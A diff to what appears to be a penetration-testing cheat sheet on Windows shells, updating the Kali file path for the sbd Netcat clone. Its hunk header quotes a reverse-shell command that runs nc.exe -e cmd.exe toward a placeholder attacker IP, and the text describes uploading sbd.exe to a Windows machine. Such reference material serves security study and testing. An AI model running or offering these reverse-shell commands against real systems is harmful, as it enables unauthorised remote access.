@@ -11,7 +11,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 
 ## SBD
 
-**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption \(by Christophe Devine\), program execution \(-e option\), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe \(part of the Kali linux distribution: /usr/share/windows-binaries/backdoors/sbd.exe\) can be uploaded to a Windows box as a Netcat alternative.
+**sbd** is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption \(by Christophe Devine\), program execution \(-e option\), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only. sbd.exe \(part of the Kali linux distribution: /usr/share/windows-resources/sbd/sbd.exe\) can be uploaded to a Windows box as a Netcat alternative.
 
 ## Python
 
